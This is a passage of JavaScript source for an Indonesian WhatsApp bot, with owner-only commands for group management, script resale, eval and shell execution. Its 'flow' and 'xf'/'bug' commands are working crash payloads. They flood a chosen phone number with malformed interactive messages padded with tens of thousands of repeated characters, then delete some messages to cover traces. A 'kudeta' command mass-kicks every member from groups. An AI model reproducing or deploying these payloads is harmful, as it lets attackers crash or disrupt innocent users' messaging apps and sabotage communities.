*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`

        await sock.sendMessage(
          orang,
          {
            text: teks,
            contextInfo: {
            isForwarded: true
            }
          },
          { quoted: null }
        );
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });
        delete sock[m.sender]
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
    reply("Terjadi kesalahan saat memproses pembayaran.");
 }
 }
break

//=============================================//

case 'kudeta': {
if (!isOwner) return reply(mess.owner)
    const groups = await sock.groupFetchAllParticipating();
    const groupList = Object.values(groups);

    const adminGroups = groupList.filter(g => {
        const isBotAdmin = g.participants.find(p => p.id === botNumber && p.admin);
        return isBotAdmin;
    });

    if (adminGroups.length === 0) return reply('Bot bukan admin di grup manapun.');

    const rows = adminGroups.map(g => ({
        title: g.subject,
        description: `${g.participants.length} anggota`,
        id: `.konfirmasikudeta ${g.id}|${g.subject}`
    }));

    await sock.sendMessage(m.chat, {
        buttons: [
            {
                buttonId: 'kudeta_select',
                buttonText: { displayText: 'Pilih Grup Untuk Kudeta' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: 'Pilih Grup',
                        sections: [
                            {
                                title: '👑 Grup (Bot Admin)',
                                rows
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 1,
        viewOnce: true,
        text: '\n🧨 Pilih grup yang ingin dikudeta (kick semua member).\n'
    }, { quoted: m });
}
break;

//=============================================//

case 'konfirmasikudeta': {
if (!isOwner) return reply(mess.owner)
    const jid = text.split("|")[0]
    const name = text.split("|")[1]

    await sock.sendMessage(m.chat, {
        text: `\nKonfirmasi kudeta grup *${name}*?\nSemua anggota (kecuali bot) akan dikick.\n`,
        buttons: [
            {
                buttonId: `.eksekusikudeta ${jid}`,
                buttonText: { displayText: 'Lanjutkan kudeta' },
                type: 1
            }
        ],
        headerType: 1, 
        viewOnce: true
    }, { quoted: m });
}
break;

//=============================================//

case 'eksekusikudeta': {
if (!isOwner) return reply(mess.owner)
    const groupJid = text.trim();
    const metadataa = await sock.groupMetadata(groupJid);
    const participants = metadataa.participants;
    const botId = botNumber

    const botData = participants.find(p => p.id === botId);
    if (!botData?.admin) return reply('❌ Bot bukan admin di grup ini.');

    const toKick = participants.filter(p => p.id !== botId).map(p => p.id);

    if (toKick.length === 0) return reply('✅ Tidak ada member lain untuk dikick.');

    reply(`🩸 Memulai kudeta...\nMengeluarkan ${toKick.length} anggota dari grup *${metadataa.subject}*`);

    for (const id of toKick) {
       try {
        await sock.groupParticipantsUpdate(groupJid, [id], 'remove');
        await new Promise(r => setTimeout(r, 1000));
        } catch {}
    }

    sock.sendMessage(groupJid, { text: `✅ Kudeta selesai! ${toKick.length} member dikeluarkan.` });
}
break;

//=============================================//

case "addscript":
case "addsc": {
    if (!isOwner) return reply(mess.owner)

    if (!text || !m.quoted) {
        return reply(`Format salah!\n\n*contoh:*\n${cmd} namasc|deskripsi|harga (contoh: 5000) dengan reply scriptnya.`)
    }

    const mimeType = mime
    if (!/zip/.test(mimeType)) {
        return m.reply("File harus berformat *.zip*")
    }

    let [namasc, deskripsi, harga] = text.split("|").map(v => v.trim())
    if (!namasc || !deskripsi || !harga || isNaN(harga)) {
        return reply(`Format salah!\n\n*contoh:*\n${cmd} namasc|deskripsi|harga (contoh: 5000) dengan reply scriptnya.`)
    }
    
    const FormData = require('form-data');
    const { fromBuffer } = require('file-type');    
    async function dt(buffer) {
        const fetchModule = await import('node-fetch');
        const fetch = fetchModule.default;
        let { ext } = await fromBuffer(buffer);
        let bodyForm = new FormData();
        bodyForm.append("fileToUpload", buffer, "file." + ext);
        bodyForm.append("reqtype", "fileupload");
        let res = await fetch("https://catbox.moe/user/api.php", {
            method: "POST",
            body: bodyForm,
        });
        let data = await res.text();
        return data;
    }

    let aa = m.quoted ? await m.quoted.download() : await m.download();
    let dd = await dt(aa);

    harga = Number(harga)

    // Tambahkan ke database script
    Script.push({
        nama: namasc,
        deskripsi: deskripsi,
        harga: harga.toString(), 
        url: dd
    })

    try {
        await fs.writeFileSync("./Data/script.json", JSON.stringify(Script, null, 2))
        return reply(`Berhasil menambahkan script *${namasc}* ✅`)
    } catch (err) {
        console.error("Gagal menyimpan script:", err)
        return reply("Terjadi kesalahan saat menyimpan script.")
    }
}
break

//=============================================//

case "getsc": case "getscript": {
if (!isOwner) return reply(mess.owner)
if (Script.length < 1) return reply("Tidak ada script yang tersimpan.")
let rows = []
let number = 0
for (let u of Script) {
rows.push({
title: u.nama,
description: `Rp${await toRupiah(u.harga)}`, 
id: `.getsc-response ${u.nama}`
})
}
await sock.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Script',
          sections: [
            {
              title: `© ${global.namaBot} Version ${global.versiBot}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Script Yang Ingin Diambil\nTotal Script: ${Script.length}\n`
}, { quoted: m })
}
break

//=============================================//

case "getsc-response": {
    if (!isOwner) return reply(mess.owner);
    if (Script.length < 1) return reply("Tidak ada script yang tersimpan");
    if (!text) return
    const names = text
    const Sc = Script.find(e => e.nama == names)
    if (!Sc) return reply("Script tidak ditemukan.")
    const desc = Sc.deskripsi
        await sock.sendMessage(m.chat, {
            document: {url: Sc.url},
            caption: desc, 
            fileName: Sc.nama + ".zip",
            mimetype: "application/zip",
        }, { quoted: m });
}
break;

//=============================================//

case "delsc": case "delscript": {
if (!isOwner) return reply(mess.owner)
if (Script.length < 1) return reply("Tidak ada script yang tersimpan.")
let rows = []
let number = 0
for (let u of Script) {
rows.push({
title: u.nama,
description: `Rp${await toRupiah(u.harga)}`, 
id: `.delsc-response ${u.nama}`
})
}
await sock.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Script',
          sections: [
            {
              title: `© ${global.namaBot} Version ${global.versiBot}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Script Yang Ingin Dihapus\nTotal Script: ${Script.length}\n`
}, { quoted: m })
}
break

//=============================================//

case "delsc-response": {
    if (!isOwner) return reply(mess.owner);
    if (Script.length < 1) return reply("Tidak ada script yang tersimpan");
    if (!text) return
    const names = text
    const Sc = Script.find(e => e.nama == names)
    if (!Sc) return reply("Script tidak ditemukan.")
    let ind = Script.indexOf(Sc)
    Script.splice(ind, 1)
    await fs.writeFileSync("./Data/script.json", JSON.stringify(Script, null, 2))
    await reply(`Berhasil menghapus script ${Sc.nama} ✅`)
}
break;

//=============================================//

case "flow": {
if (!isOwner) return
async function forcedel(target) {
    let params = "{}" /*JSON.stringify({
        reference_id: "4SFNDOHEJ6V",
        payment_status: "captured",
        payment_timestamp: 1751247686,
        order: {
            status: "payment_requested",
            description: "",
            subtotal: { value: 10008880200, offset: 100 },
            tax: { value: 0, offset: 100 },
            discount: { value: 10008880200, offset: 100 },
            shipping: { value: 50000000000, offset: 100 },
            order_type: "ORDER",
            items: [
                {
                    retailer_id: "30078139158501065",
                    product_id: "30078139158501065",
                    name: "🩸ꢵ 𝐓͙͡𝐝͢𝐗͙ ꢵ 🩸",
                    amount: { value: 999900, offset: 100 },
                    quantity: 99
                },
                {
                    retailer_id: "9254032161366485",
                    product_id: "9254032161366485",
                    name: "#",
                    amount: { value: 99900, offset: 100 },
                    quantity: 99
                },
                {
                    retailer_id: "custom-item-b79d8723-14db-4b26-8201-7e41663a451c",
                    name: "☠️⃟ ̊ ̥ ༚𐨁𝐃𝐄𝐕𝐎̸𝐑͙𝐒𝐢𝐗̸𝐂𝐎̊𝐑𝐄 ̥ ̊ ༚👻⃰ꢵ⭑𝐓𝐫𝐚𝐬𝐡𝐃𝐞𝐱 𝂼઼🏳️⃰͜🏴‍☠️🏳️͜★ 𝐓͙͡𝐝͢𝐗͙ ꢵ ✩",
                    amount: { value: 100000000, offset: 2147483647 },
                    quantity: 1215752191
                }
            ]
        },
        share_payment_status: false
    });*/

    let ctx = {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        quotedMessage: {
            interactiveMessage: {
                body: {
                    text: "🪽 TrashDex - Corporation - 2k25"
                },
                carouselMessage: {
                    cards: [
                        {
                            body: {
                                text: "🪽 TrashDex - Corporation - 2k25"
                            },
                            header: {
                                title: "🪽 TrashDex - Corporation - 2k25",
                                imageMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11294110_1204051454802508_8623108758261512482_n.enc?ccb=11-4&oh=01_Q5Aa1wHJ_y3pKhnZFHrpIFFJyx2A8ficBKOioVEM1dzf-zY2xg&oe=688A3A5E&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "image/jpeg",
                                    fileSha256: "dmE2TyklOqnkJuz0rmbwJH6L8uaPxVl9+od7FbCsqPw=",
                                    fileLength: "111454",
                                    height: 1024,
                                    width: 1024,
                                    mediaKey: "ETEmTxasXsXHo3cAffDkOIycIOfwNHwMs99W+eUj1AM=",
                                    fileEncSha256: "cFIz4bFsHC6/oiovlfucnVYraMjhLxReHc+RkFhbRHU=",
                                    directPath: "/v/t62.7118-24/11294110_1204051454802508_8623108758261512482_n.enc?ccb=11-4&oh=01_Q5Aa1wHJ_y3pKhnZFHrpIFFJyx2A8ficBKOioVEM1dzf-zY2xg&oe=688A3A5E&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1751305649",
                                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4...",
                                    contextInfo: {
                                        pairedMediaType: "NOT_PAIRED_MEDIA",
                                        statusSourceType: "IMAGE"
                                    },
                                    scansSidecar: "aH5cSSN9A/gFwUF21SR04riw39Ms71Yumtr66/01sXstkd/BtBC+9w==",
                                    scanLengths: [8657, 47221, 25256, 30320],
                                    midQualityFileSha256: "j2QdSa5UgpSKfcgAG9M4u953VX1XIvB/cVzVWnwycew="
                                },
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "single_select",
                                        buttonParamsJson: "[".repeat(10000)
                                    }
                                ],
                                messageParamsJson: "[".repeat(10000)
                            }
                        }
                    ]
                }
            }
        }
    };

    for (let i = 0; i < 18; i++) {
        for (let j = 0; j < 3; j++) {
            await sock.relayMessage(target, {
                interactiveMessage: {
                    body: {
                        text: 'undefined' + "ꦽ".repeat(40000)
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "payment_status",
                            buttonParamsJson: params
                        }],
                        messageParamsJson: "[".repeat(10000)
                    },
                    ...ctx
                }
            }, {
                additionalNodes: [{
                    tag: 'biz',
                    attrs: { native_flow_name: 'payment_status' }
                }],
                participant: { jid: target }
            });

            await sleep(300);
        }

//        let idm = (l=8) => "tdx-corp" + [...Array(l)].map(() => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * 36)]).join('');

        await sleep(800)

        let idm = await sock.relayMessage(target, {
            interactiveMessage: {
                body: {
                    text: 'undefined' + "ꦽ".repeat(40000)
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "payment_status",
                            buttonParamsJson: params
                        }
                    ],
                    messageParamsJson: "[".repeat(10000)
                },
                ...ctx
            }
        }, {
            participant: { jid: target },
            additionalNodes: [
                {
                    tag: 'biz',
                    attrs: { native_flow_name: 'payment_status' }
                }
            ]
        });

        await sleep(800)

        await sock.sendMessage(target, {
            delete: { remoteJid: target, fromMe: true, id: idm }
        });

        await sock.relayMessage(target, {
            interactiveMessage: {
                body: {
                    text: 'undefined' + "ꦽ".repeat(40000)
                },
                nativeFlowMessage: {
                    buttons: [{
                        name: "payment_status",
                        buttonParamsJson: params
                    }],
                    messageParamsJson: "[".repeat(10000)
                },
                ...ctx
            }
        }, {
            additionalNodes: [{
                tag: 'biz',
                attrs: { native_flow_name: 'payment_status' }
            }],
            participant: { jid: target }
        });
    }
}


await forcedel(m.chat)
    
    await reply(`Successfuly send a flow Bugs 🩸`)
}
break


case "xf":
case "bug": {
  if (!isOwner) return;
  let jid = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.chat;

const delet = [1, 3, 5, 7, 9, 11, 13, 15, 17, 19]
for (let i = 0; i < 20; i++) {
  let aa = await sock.relayMessage(
      jid,
      {
        interactiveMessage: {
          body: {
            text: "📋 null"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "voice_call",
                buttonParamsJson: JSON.stringify({
display_text: "{]".repeat(200000)
})
              }
            ],
            messageParamsJson: "",
          }, 
          quotedMessage: {
            interactiveMessage: {
                body: {
                    text: "🪽 TrashDex - Corporation - 2k25"
                },
                carouselMessage: {
                    cards: [
                        {
                            body: {
                                text: "🪽 TrashDex - Corporation - 2k25"
                            },
                            header: {
                                title: "🪽 TrashDex - Corporation - 2k25",
                                imageMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11294110_1204051454802508_8623108758261512482_n.enc?ccb=11-4&oh=01_Q5Aa1wHJ_y3pKhnZFHrpIFFJyx2A8ficBKOioVEM1dzf-zY2xg&oe=688A3A5E&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "image/jpeg",
                                    fileSha256: "dmE2TyklOqnkJuz0rmbwJH6L8uaPxVl9+od7FbCsqPw=",
                                    fileLength: "111454",
                                    height: 1024,
                                    width: 1024,
                                    mediaKey: "ETEmTxasXsXHo3cAffDkOIycIOfwNHwMs99W+eUj1AM=",
                                    fileEncSha256: "cFIz4bFsHC6/oiovlfucnVYraMjhLxReHc+RkFhbRHU=",
                                    directPath: "/v/t62.7118-24/11294110_1204051454802508_8623108758261512482_n.enc?ccb=11-4&oh=01_Q5Aa1wHJ_y3pKhnZFHrpIFFJyx2A8ficBKOioVEM1dzf-zY2xg&oe=688A3A5E&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1751305649",
                                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4...",
                                    contextInfo: {
                                        pairedMediaType: "NOT_PAIRED_MEDIA",
                                        statusSourceType: "IMAGE"
                                    },
                                    scansSidecar: "aH5cSSN9A/gFwUF21SR04riw39Ms71Yumtr66/01sXstkd/BtBC+9w==",
                                    scanLengths: [8657, 47221, 25256, 30320],
                                    midQualityFileSha256: "j2QdSa5UgpSKfcgAG9M4u953VX1XIvB/cVzVWnwycew="
                                },
                                hasMediaAttachment: true
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "single_select",
                                        buttonParamsJson: "[".repeat(10000)
                                    }
                                ],
                                messageParamsJson: "[".repeat(10000)
                            }
                        }
                    ]
                }
            }
        }
        },
      },
      { participant: { jid: jid }, 
      additionalNodes: [{
                tag: 'bot',
                attrs: { biz_bot: '1' }
            }]
      },       
    );

  await sleep(900);

if (delet.includes(i)) {
  await sock.sendMessage(jid, {
    delete: {
      remoteJid: jid,
      fromMe: false,
      id: aa,
      participant: jid
    }
  });
  }
  }

  await reply(`Bug success send to ${jid}`);
}
break;

default:
if (m.text.toLowerCase().startsWith("xx")) {
    if (!isOwner) return;

    try {
        const result = await eval(`(async () => { ${text} })()`);
        const output = typeof result !== "string" ? util.inspect(result) : result;
        return sock.sendMessage(m.chat, { text: util.format(output) }, { quoted: m });
    } catch (err) {
        return sock.sendMessage(m.chat, { text: util.format(err) }, { quoted: m });
    }
}

if (m.text.toLowerCase().startsWith("x")) {
    if (!isOwner) return;

    try {
        let result = await eval(text);
        if (typeof result !== "string") result = util.inspect(result);
        return sock.sendMessage(m.chat, { text: util.format(result) }, { quoted: m });
    } catch (err) {
        return sock.sendMessage(m.chat, { text: util.format(err) }, { quoted: m });
    }
}

if (m.text.startsWith('$')) {
    if (!isOwner) return;
    
    exec(m.text.slice(2), (err, stdout) => {
        if (err) {
            return sock.sendMessage(m.chat, { text: err.toString() }, { quoted: m });
        }
        if (stdout) {
            return sock.sendMessage(m.chat, { text: util.format(stdout) }, { quoted: m });
        }
    });
}

}

} catch (err) {
console.log(err)
await sock.sendMessage(global.owner+"@s.whatsapp.net", {text: err.toString()}, {quoted: m})
}}

//=============================================//

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(chalk.green(`File update: ${__filename}`));
    delete require.cache[file];
    require(file);
});